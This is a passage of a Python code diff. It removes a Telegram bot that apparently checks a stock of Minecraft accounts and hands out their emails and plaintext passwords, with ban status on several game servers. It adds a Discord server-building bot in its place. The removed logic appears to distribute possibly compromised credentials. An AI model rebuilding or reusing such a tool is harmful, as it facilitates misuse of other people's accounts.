-            return
-        
-        await self._display_claimed_account(update, account)
+        except Exception:
+            logger.debug("Progress edit skipped (rate limit or unchanged content)")
 
-    async def release_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        if not await self._check_auth(update):
-            return
-        
-        account = db.get_account_by_user(update.effective_user.id)
-        
-        if not account:
-            await update.message.reply_text("❌ You don't have any account to release.")
-            return
-        
-        db.release_account(account["id"])
-        await update.message.reply_text(
-            f"✅ Released account {account['email']} back to stock.\n"
-            f"Use /start to get another."
+    try:
+        progress = await build_server(guild, selected_games, on_progress=on_progress)
+        game_names = ", ".join(GAME_DATABASE[k].name for k in selected_games if k in GAME_DATABASE)
+        await progress_message.edit_text(
+            "✅ <b>Server Build Complete</b>\n\n"
+            f"Server: <b>{guild.name}</b>\n"
+            f"Games: <b>{game_names}</b>\n"
+            f"Total steps: <b>{progress.steps_done}</b>\n\n"
+            "Roles, categories, channels, and permissions have been created successfully.",
+            reply_markup=home_keyboard(),
         )
-
-    async def _display_claimed_account(self, update_obj, account: Dict):
-        hypixel_emoji = "🟢" if account["hypixel_status"] == "online" else "🔴" if account["hypixel_status"] == "offline" else "⚪"
-        donut_emoji = "🟢" if account["donutsmp_status"] == "online" else "🔴" if account["donutsmp_status"] == "offline" else "⚪"
-        cubecraft_emoji = "🟢" if account["cubecraft_status"] == "online" else "🔴" if account["cubecraft_status"] == "offline" else "⚪"
-        bedrock_emoji = "✅ YES" if account["bedrock_owned"] else "❌ NO"
-        
-        message = (
-            f"📋 YOUR CLAIMED ACCOUNT\n"
-            f"═══════════════════════════\n\n"
-            f"📧 Email: {account['email']}\n"
-            f"🔑 Password: {account['password']}\n"
-            f"🎮 Username: {account['username']}\n\n"
-            f"━━━━━━━━━━━━━━━━━━━\n"
-            f"🟡 HYPIXEL\n"
-            f"   Status: {hypixel_emoji} {account['hypixel_status']}\n"
-            f"   Rank: {account['hypixel_rank']}\n"
-            f"   Banned: {'✅ YES' if account['hypixel_banned'] else '❌ NO'}\n\n"
-            f"🟠 DONUTSMP\n"
-            f"   Status: {donut_emoji} {account['donutsmp_status']}\n"
-            f"   Banned: {'✅ YES' if account['donutsmp_banned'] else '❌ NO'}\n"
-            f"   Kills: {account['donutsmp_kills']} | Deaths: {account['donutsmp_deaths']}\n\n"
-            f"🟢 CUBECRAFT\n"
-            f"   Status: {cubecraft_emoji} {account['cubecraft_status']}\n"
-            f"   Rank: {account['cubecraft_rank']}\n"
-            f"   Banned: {'✅ YES' if account['cubecraft_banned'] else '❌ NO'}\n\n"
-            f"🎮 BEDROCK EDITION\n"
-            f"   Owned: {bedrock_emoji}\n\n"
-            f"✅ This account is YOURS.\n"
-            f"Use /release to give it back."
+        logger.info("Server build completed for guild_id=%s (%s)", guild.id, guild.name)
+    except Exception as exc:
+        logger.exception("Server build failed for guild_id=%s", guild.id)
+        await progress_message.edit_text(
+            "❌ <b>Build Failed</b>\n\n"
+            f"An error occurred while building the server: <code>{exc}</code>\n"
+            "Any partially created channels/categories have been rolled back.\n\n"
+            "Make sure the bot has Administrator permission and try again.",
+            reply_markup=home_keyboard(),
         )
-        
-        keyboard = [
-            [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        if hasattr(update_obj, 'edit_message_text'):
-            await update_obj.edit_message_text(message, reply_markup=reply_markup)
-        else:
-            await update_obj.message.reply_text(message, reply_markup=reply_markup)
+    finally:
+        await state.clear()
 
-    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        query = update.callback_query
-        await query.answer()
-        
-        try:
-            if query.data == "scan":
-                await query.edit_message_text("Use /scan command to start verification.")
-            
-            elif query.data == "get_account":
-                existing = db.get_account_by_user(update.effective_user.id)
-                if existing:
-                    await query.edit_message_text(
-                        f"❌ You already have an account claimed!\n"
-                        f"Email: {existing['email']}\n"
-                        f"Use /release to give it back."
-                    )
-                    return
-                
-                valid_accounts = db.get_valid_accounts()
-                
-                if not valid_accounts:
-                    await query.edit_message_text(
-                        "❌ No valid accounts available!\n"
-                        "Use /scan to verify accounts first."
-                    )
-                    return
-                
-                # Get shown history
-                shown_ids = db.get_shown_history(update.effective_user.id)
-                
-                # Filter out shown accounts
-                available_not_shown = [acc for acc in valid_accounts if acc["id"] not in shown_ids]
-                
-                if not available_not_shown:
-                    db.clear_shown_history(update.effective_user.id)
-                    shown_ids = []
-                    available_not_shown = valid_accounts
-                
-                account = available_not_shown[0]
-                db.add_shown_history(update.effective_user.id, account["id"])
-                
-                hypixel_emoji = "🟢" if account["hypixel_status"] == "online" else "🔴" if account["hypixel_status"] == "offline" else "⚪"
-                donut_emoji = "🟢" if account["donutsmp_status"] == "online" else "🔴" if account["donutsmp_status"] == "offline" else "⚪"
-                cubecraft_emoji = "🟢" if account["cubecraft_status"] == "online" else "🔴" if account["cubecraft_status"] == "offline" else "⚪"
-                bedrock_emoji = "✅ YES" if account["bedrock_owned"] else "❌ NO"
-                
-                remaining = db.get_valid_count()
-                
-                message = (
-                    f"🎮 VALID ACCOUNT #{account['id']}\n"
-                    f"═══════════════════════════\n\n"
-                    f"📧 Email: {account['email']}\n"
-                    f"🔑 Password: {account['password']}\n"
-                    f"🎮 Username: {account['username']}\n\n"
-                    f"━━━━━━━━━━━━━━━━━━━\n"
-                    f"🟡 HYPIXEL\n"
-                    f"   Status: {hypixel_emoji} {account['hypixel_status']}\n"
-                    f"   Rank: {account['hypixel_rank']}\n"
-                    f"   Banned: {'✅ YES' if account['hypixel_banned'] else '❌ NO'}\n\n"
-                    f"🟠 DONUTSMP\n"
-                    f"   Status: {donut_emoji} {account['donutsmp_status']}\n"
-                    f"   Banned: {'✅ YES' if account['donutsmp_banned'] else '❌ NO'}\n"
-                    f"   Kills: {account['donutsmp_kills']} | Deaths: {account['donutsmp_deaths']}\n\n"
-                    f"🟢 CUBECRAFT\n"
-                    f"   Status: {cubecraft_emoji} {account['cubecraft_status']}\n"
-                    f"   Rank: {account['cubecraft_rank']}\n"
-                    f"   Banned: {'✅ YES' if account['cubecraft_banned'] else '❌ NO'}\n\n"
-                    f"🎮 BEDROCK EDITION\n"
-                    f"   Owned: {bedrock_emoji}\n\n"
-                    f"📊 Remaining valid accounts: {remaining}\n\n"
-                    f"⚠️ This account is VERIFIED and working!\n"
-                    f"Click 'CLAIM ACCOUNT' to make it YOURS."
-                )
-                
-                keyboard = [
-                    [InlineKeyboardButton("✅ CLAIM ACCOUNT", callback_data=f"claim_{account['id']}")],
-                    [InlineKeyboardButton("🔄 SHOW ANOTHER", callback_data="get_account")],
-                    [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")]
-                ]
-                reply_markup = InlineKeyboardMarkup(keyboard)
-                await query.edit_message_text(message, reply_markup=reply_markup)
-            
-            elif query.data.startswith("claim_"):
-                account_id = int(query.data.split("_")[1])
-                
-                existing = db.get_account_by_user(update.effective_user.id)
-                if existing:
-                    await query.edit_message_text(
-                        f"❌ You already have an account claimed!\n"
-                        f"Email: {existing['email']}"
-                    )
-                    return
-                
-                db.cursor.execute("SELECT id FROM accounts WHERE id = ? AND is_valid = 1 AND claimed_by = 0", (account_id,))
-                row = db.cursor.fetchone()
-                
-                if not row:
-                    await query.edit_message_text(
-                        "❌ This account was already claimed!\n"
-                        "Click 'SHOW ANOTHER' for a different account."
-                    )
-                    return
-                
-                db.claim_account(account_id, update.effective_user.id)
-                db.clear_shown_history(update.effective_user.id)
-                
-                claimed = db.get_account_by_user(update.effective_user.id)
-                if claimed:
-                    await self._display_claimed_account(query, claimed)
-                else:
-                    await query.edit_message_text("✅ Account claimed successfully!")
-            
-            elif query.data == "view_stats":
-                stats = db.get_stats()
-                keyboard = [
-                    [InlineKeyboardButton("🔍 SCAN", callback_data="scan")],
-                    [InlineKeyboardButton("🎮 GET ACCOUNT", callback_data="get_account")],
-                    [InlineKeyboardButton("🔙 BACK", callback_data="back_to_menu")]
-                ]
-                reply_markup = InlineKeyboardMarkup(keyboard)
-                
-                await query.edit_message_text(
-                    f"📊 ACCOUNT STATISTICS\n"
-                    f"═══════════════════════════\n\n"
-                    f"📦 Total accounts: {stats['total']}\n"
-                    f"✅ Valid accounts: {stats['valid']}\n"
-                    f"❌ Invalid accounts: {stats['invalid']}\n"
-                    f"🔒 Claimed accounts: {stats['claimed']}\n"
-                    f"📊 Available valid: {stats['available']}",
-                    reply_markup=reply_markup
-                )
-            
-            elif query.data == "myaccount":
-                account = db.get_account_by_user(update.effective_user.id)
-                
-                if not account:
-                    await query.edit_message_text(
-                        "❌ You don't have any account claimed.\n"
-                        "Use /scan then click 'GET ACCOUNT'."
-                    )
-                    return
-                
-                await self._display_claimed_account(query, account)
-            
-            elif query.data == "back_to_menu":
-                stats = db.get_stats()
-                keyboard = [
-                    [InlineKeyboardButton("🔍 SCAN ACCOUNTS", callback_data="scan")],
-                    [InlineKeyboardButton("🎮 GET ACCOUNT", callback_data="get_account")],
-                    [InlineKeyboardButton("📊 VIEW STATS", callback_data="view_stats")],
-                    [InlineKeyboardButton("📋 MY ACCOUNT", callback_data="myaccount")]
-                ]
-                reply_markup = InlineKeyboardMarkup(keyboard)
-                
-                await query.edit_message_text(
-                    f"🔓 MINECRAFT ACCOUNT VERIFIER\n"
-                    f"═══════════════════════════\n\n"
-                    f"📦 Total accounts: {stats['total']}\n"
-                    f"✅ Valid accounts: {stats['valid']}\n"
-                    f"❌ Invalid accounts: {stats['invalid']}\n"
-                    f"🔒 Claimed accounts: {stats['claimed']}\n"
-                    f"📊 Available: {stats['available']}",
-                    reply_markup=reply_markup
-                )
-                
-        except Exception as e:
-            logger.error(f"Callback error: {e}")
-            await query.edit_message_text(f"Error: {str(e)}")
 
-    def run(self):
-        logger.info("Minecraft Account Verifier Bot starting...")
+# ---------------------------------------------------------------------------
+# Entrypoint
+# ---------------------------------------------------------------------------
+
+async def main() -> None:
+    bot = Bot(
+        token=TELEGRAM_BOT_TOKEN,
+        default=DefaultBotProperties(parse_mode=ParseMode.HTML),
+    )
+    dispatcher = Dispatcher(storage=MemoryStorage())
+    dispatcher.include_router(router)
+
+    logger.info("Starting Discord bot and Telegram bot concurrently…")
+
+    async def run_discord() -> None:
         try:
-            self.app.run_polling()
-        except Exception as e:
-            logger.error(f"Bot error: {e}")
-            sys.exit(1)
+            await discord_bot.start(DISCORD_BOT_TOKEN)
+        except discord.LoginFailure:
+            logger.critical("Invalid DISCORD_BOT_TOKEN — could not log in to Discord")
+            raise
+        except Exception:
+            logger.exception("Discord bot crashed")
+            raise
+
+    async def run_telegram() -> None:
+        try:
+            await bot.delete_webhook(drop_pending_updates=True)
+            await dispatcher.start_polling(bot)
+        except Exception:
+            logger.exception("Telegram bot crashed")
+            raise
+
+    try:
+        await asyncio.gather(run_discord(), run_telegram())
+    finally:
+        await bot.session.close()
+        if not discord_bot.is_closed():
+            await discord_bot.close()
+
 
 if __name__ == "__main__":
-    if not BOT_TOKEN:
-        logger.error("BOT_TOKEN not set.")
-        sys.exit(1)
-    
-    bot = MinecraftBot(BOT_TOKEN)
-    bot.run()
+    try:
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        logger.info("Shutting down (keyboard interrupt)")
